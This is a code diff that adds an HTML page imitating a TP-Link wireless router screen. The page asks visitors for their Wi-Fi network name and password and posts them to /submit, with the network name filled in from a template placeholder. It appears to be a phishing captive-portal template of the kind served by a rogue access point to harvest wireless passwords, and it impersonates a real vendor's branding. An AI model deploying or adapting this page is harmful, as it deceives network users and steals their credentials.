@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>TP-Link Wireless Router</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta charset="utf-8">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: #f0f0f0;
+            margin: 0;
+            padding: 20px;
+        }
+        .container {
+            max-width: 400px;
+            margin: 50px auto;
+            background: white;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+        }
+        .header {
+            background: #00a8e1;
+            color: white;
+            padding: 20px;
+            text-align: center;
+            border-radius: 4px 4px 0 0;
+        }
+        .header h1 {
+            font-size: 20px;
+            margin: 0;
+        }
+        .content {
+            padding: 30px;
+        }
+        .info {
+            background: #fffbcc;
+            border: 1px solid #e6db55;
+            padding: 10px;
+            margin-bottom: 20px;
+            font-size: 13px;
+            border-radius: 3px;
+        }
+        .form-group {
+            margin-bottom: 15px;
+        }
+        label {
+            display: block;
+            margin-bottom: 5px;
+            font-size: 14px;
+            color: #333;
+        }
+        input[type="text"],
+        input[type="password"] {
+            width: 100%;
+            padding: 8px;
+            border: 1px solid #ccc;
+            border-radius: 3px;
+            font-size: 14px;
+            box-sizing: border-box;
+        }
+        button {
+            width: 100%;
+            padding: 10px;
+            background: #00a8e1;
+            color: white;
+            border: none;
+            border-radius: 3px;
+            font-size: 14px;
+            cursor: pointer;
+        }
+        button:hover {
+            background: #0090c0;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>TP-Link Wireless Router</h1>
+        </div>
+        <div class="content">
+            <div class="info">
+                Please enter your wireless network credentials to continue.
+            </div>
+            <form method="POST" action="/submit">
+                <div class="form-group">
+                    <label>Wireless Network Name:</label>
+                    <input type="text" name="ssid" value="{{ssid}}" required>
+                </div>
+                <div class="form-group">
+                    <label>Password:</label>
+                    <input type="password" name="password" required>
+                </div>
+                <button type="submit">Connect</button>
+            </form>
+        </div>
+    </div>
+</body>
+</html>
